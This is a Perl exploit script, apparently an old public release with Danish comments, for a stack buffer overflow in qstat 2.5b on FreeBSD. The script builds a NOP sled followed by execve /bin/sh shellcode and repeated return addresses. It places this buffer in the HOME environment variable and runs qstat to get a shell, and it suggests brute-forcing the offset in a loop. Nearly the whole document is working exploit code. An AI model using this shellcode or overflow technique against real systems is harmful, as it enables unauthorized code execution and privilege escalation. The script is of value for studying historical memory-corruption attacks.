#!/usr/bin/perl
#qute.pl; useless script for exploiting a buffer overflow in qstat2.5b.
#Useless because qstat isn't suid per default.
#Just like http://packetstorm.decepticons.org/filedesc/qspl.c.html
#but in perl, made on/for my FreeBSD, i need a job and a life.
#Made due to boredom by K.E. Højgaard / knudATskodliv.dk.
#Again: u s e l e s s. Incomprehensible words below are danish.

$len = 1044;        # bufferlængde for at overskrive EIP
$ret = 0xbfbeea8c;  # ESP ved qstat `perl -e 'print "A" x 1044'` -> gdb -q
qstat qstat.core -> i r esp
$nop = "\x90";      # x86 NOP
$offset = 70000;    # hvor ligger vores ENV var ($HOME) i forhold til ESP?
$shellcode =    "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56". #freebsd 29
bytes
                "\xb0\x3b\x50\xcd\x80\xe8\xed\xff\xff\xff\x2f". #execve
/bin/sh skal-kode
                "\x62\x69\x6e\x2f\x73\x68\x23";
#zillionATsafemode.org
#hård-kodede variabler

if (@ARGV == 1) {
    $offset = $ARGV[0];
}

#skidesmart, bruteforce offset med f.eks: for i in `jot 100000` ; do
./qute.pl $i ; done
#og en masse kaffe, smøger, og ^C.

for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}
#fylder NOP's i $buffer

$buffer .= $shellcode;
#klistrer $shellcode på enden af bufferen

print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
#printer default $ret + $offset som hex på stdout

$new_ret = pack('l', ($ret + $offset));
#pack laver $ret og $offset til en binær struktur kaldet $new_ret

for ($i += length($shellcode); $i < $len; $i += 4) {
    $buffer .= $new_ret;
}
#klistrer $new_ret på enden af $buffer indtil den har den ønskede længde

local($ENV{'HOME'}) = $buffer;
# sætter env variablen ($HOME) hvilket er hvad der overflower programmet

exec("./qstat");
# kører lortet.. hahahah

